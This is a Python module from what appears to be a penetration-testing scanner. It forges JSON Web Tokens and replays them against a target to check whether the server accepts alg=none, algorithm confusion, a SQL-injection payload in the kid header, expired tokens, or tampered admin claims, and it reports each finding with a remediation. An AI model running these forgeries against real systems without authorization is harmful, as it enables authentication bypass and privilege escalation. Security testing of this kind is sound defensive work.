"""
BossKey — JWT advanced attack testing.

Tests for:
- Algorithm confusion (none, HS256 with RS256 public key)
- Key ID (kid) injection
- JWK/JKU header injection
- Token expiry bypass
- Claim manipulation
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from dataclasses import dataclass
from typing import Any, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClientMixin

logger = logging.getLogger("krumpa.bosskey.jwt_attacks")


@dataclass
class JwtAttackResult:
    """Result of a JWT attack attempt."""
    attack_type: str
    token_accepted: bool
    original_token: str = ""
    forged_token: str = ""
    status_code: int = 0


class JwtAdvancedTester(HttpClientMixin):
    """Test JWT implementations for common vulnerabilities."""

    def __init__(self, http_client: Any = None) -> None:
        self._client = http_client
        self._owns_client = False

    async def test(
        self,
        target: Target,
        *,
        token: Optional[str] = None,
    ) -> List[Finding]:
        """Run all JWT attack tests."""
        jwt_token = token or self._extract_token(target)
        if not jwt_token:
            return []

        findings: List[Finding] = []
        attacks = [
            ("alg-none", self._test_alg_none),
            ("alg-confusion", self._test_alg_confusion),
            ("kid-injection", self._test_kid_injection),
            ("expired-token", self._test_expired_token),
            ("claim-tampering", self._test_claim_tampering),
        ]

        for attack_name, attack_fn in attacks:
            result = await attack_fn(target, jwt_token)
            if result and result.token_accepted:
                sev = Severity.CRITICAL if attack_name in ("alg-none", "alg-confusion") else Severity.HIGH
                findings.append(Finding(
                    title=f"JWT vulnerability: {attack_name}",
                    description=(
                        f"JWT {attack_name} attack accepted by {target.url}. "
                        f"Forged token was accepted with status {result.status_code}."
                    ),
                    severity=sev,
                    target=target,
                    evidence=f"attack={attack_name}, status={result.status_code}",
                    remediation=self._remediation(attack_name),
                    cwe=347,
                    tags=["jwt", attack_name, "authentication"],
                ))

        return findings

    def analyze_token(self, token: str) -> List[Finding]:
        """Offline analysis of a JWT token."""
        findings: List[Finding] = []
        parts = token.split(".")
        if len(parts) != 3:
            return findings

        try:
            header = json.loads(self._b64_decode(parts[0]))
            payload = json.loads(self._b64_decode(parts[1]))
        except Exception:
            return findings

        alg = header.get("alg", "")
        if alg.lower() == "none":
            findings.append(Finding(
                title="JWT uses 'none' algorithm",
                description="Token header specifies alg=none, meaning no signature verification.",
                severity=Severity.CRITICAL,
                target=Target(url="jwt://token"),
                cwe=347,
                tags=["jwt", "alg-none"],
            ))

        if alg == "HS256":
            findings.append(Finding(
                title="JWT uses symmetric algorithm (HS256)",
                description="If the server also has RS256 keys, algorithm confusion attacks may be possible.",
                severity=Severity.LOW,
                target=Target(url="jwt://token"),
                cwe=327,
                tags=["jwt", "algorithm"],
            ))

        if "kid" in header:
            findings.append(Finding(
                title="JWT contains 'kid' header parameter",
                description=f"kid={header['kid']} — potential injection point for path traversal or SQL injection.",
                severity=Severity.LOW,
                target=Target(url="jwt://token"),
                cwe=20,
                tags=["jwt", "kid"],
            ))

        if "jku" in header or "x5u" in header:
            findings.append(Finding(
                title="JWT contains URL-based key reference",
                description=f"Header contains jku/x5u pointing to external key — SSRF risk.",
                severity=Severity.MEDIUM,
                target=Target(url="jwt://token"),
                cwe=918,
                tags=["jwt", "ssrf"],
            ))

        import time
        exp = payload.get("exp")
        if exp and exp < time.time():
            findings.append(Finding(
                title="JWT token is expired",
                description=f"Token exp={exp} is in the past. If accepted, expiry validation is broken.",
                severity=Severity.INFO,
                target=Target(url="jwt://token"),
                cwe=613,
                tags=["jwt", "expiry"],
            ))

        return findings

    # ------------------------------------------------------------------
    # Attack implementations
    # ------------------------------------------------------------------

    async def _test_alg_none(self, target: Target, token: str) -> Optional[JwtAttackResult]:
        """Test algorithm=none bypass."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            header = json.loads(self._b64_decode(parts[0]))
        except Exception:
            return None

        header["alg"] = "none"
        forged_header = self._b64_encode(json.dumps(header))
        forged_token = f"{forged_header}.{parts[1]}."

        return await self._try_token(target, token, forged_token, "alg-none")

    async def _test_alg_confusion(self, target: Target, token: str) -> Optional[JwtAttackResult]:
        """Test algorithm confusion (switch RS256 to HS256)."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            header = json.loads(self._b64_decode(parts[0]))
        except Exception:
            return None

        if header.get("alg") not in ("RS256", "RS384", "RS512"):
            return None  # only relevant for RSA algorithms

        header["alg"] = "HS256"
        forged_header = self._b64_encode(json.dumps(header))
        # Sign with empty key (common misconfiguration)
        msg = f"{forged_header}.{parts[1]}".encode()
        sig = hmac.new(b"", msg, hashlib.sha256).digest()
        forged_sig = self._b64_encode_bytes(sig)
        forged_token = f"{forged_header}.{parts[1]}.{forged_sig}"

        return await self._try_token(target, token, forged_token, "alg-confusion")

    async def _test_kid_injection(self, target: Target, token: str) -> Optional[JwtAttackResult]:
        """Test kid parameter injection."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            header = json.loads(self._b64_decode(parts[0]))
        except Exception:
            return None

        # Try SQL injection in kid
        header["kid"] = "' UNION SELECT '' -- "
        forged_header = self._b64_encode(json.dumps(header))
        msg = f"{forged_header}.{parts[1]}".encode()
        sig = hmac.new(b"", msg, hashlib.sha256).digest()
        forged_sig = self._b64_encode_bytes(sig)
        forged_token = f"{forged_header}.{parts[1]}.{forged_sig}"

        return await self._try_token(target, token, forged_token, "kid-injection")

    async def _test_expired_token(self, target: Target, token: str) -> Optional[JwtAttackResult]:
        """Test if expired tokens are still accepted."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            payload = json.loads(self._b64_decode(parts[1]))
        except Exception:
            return None

        # Set expiry to past
        payload["exp"] = 1  # epoch + 1 second
        forged_payload = self._b64_encode(json.dumps(payload))
        forged_token = f"{parts[0]}.{forged_payload}.{parts[2]}"

        return await self._try_token(target, token, forged_token, "expired-token")

    async def _test_claim_tampering(self, target: Target, token: str) -> Optional[JwtAttackResult]:
        """Test if claim changes are detected."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            payload = json.loads(self._b64_decode(parts[1]))
        except Exception:
            return None

        # Escalate claims
        payload["role"] = "admin"
        payload["is_admin"] = True
        payload["sub"] = "admin"
        forged_payload = self._b64_encode(json.dumps(payload))
        forged_token = f"{parts[0]}.{forged_payload}.{parts[2]}"

        return await self._try_token(target, token, forged_token, "claim-tampering")

    async def _try_token(
        self, target: Target, original: str, forged: str, attack: str,
    ) -> Optional[JwtAttackResult]:
        """Send a forged token and check acceptance."""
        if not self._client:
            return None

        try:
            resp = await self._client.request(
                method=target.method or "GET",
                url=target.url,
                headers={"Authorization": f"Bearer {forged}"},
            )
            accepted = resp.status_code < 400
            return JwtAttackResult(
                attack_type=attack,
                token_accepted=accepted,
                original_token=original[:50] + "...",
                forged_token=forged[:50] + "...",
                status_code=resp.status_code,
            )
        except Exception as exc:
            logger.debug("JWT attack error (%s): %s", attack, exc)
            return None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_token(target: Target) -> Optional[str]:
        auth = target.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:]
        return target.metadata.get("jwt_token")

    @staticmethod
    def _b64_decode(data: str) -> bytes:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def _b64_encode(data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()

    @staticmethod
    def _b64_encode_bytes(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _remediation(attack: str) -> str:
        remediations = {
            "alg-none": "Reject tokens with alg=none. Always validate the algorithm server-side.",
            "alg-confusion": "Pin the expected algorithm. Never accept HS256 tokens when RS256 is configured.",
            "kid-injection": "Sanitize the kid parameter. Use allowlist-based key lookup.",
            "expired-token": "Always validate the exp claim. Reject expired tokens.",
            "claim-tampering": "Always verify the JWT signature before trusting claims.",
        }
        return remediations.get(attack, "Review JWT implementation security.")
